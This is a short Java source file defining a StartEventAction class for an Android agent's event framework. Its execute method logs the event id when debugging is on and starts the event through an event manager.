package com.android.service.action;

import org.json.JSONObject;

import com.android.service.Trigger;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfAction;
import com.android.service.event.BaseEvent;
import com.android.service.manager.ManagerAgent;
import com.android.service.manager.ManagerEvent;
import com.android.service.util.Check;

public class StartEventAction extends EventAction {
	private static final String TAG = "StartEventAction";

	public StartEventAction(ConfAction params) {
		super( params);
	}

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
		}
		final ManagerEvent eventManager = ManagerEvent.self();

		eventManager.start(eventId);
		return true;
	}

}
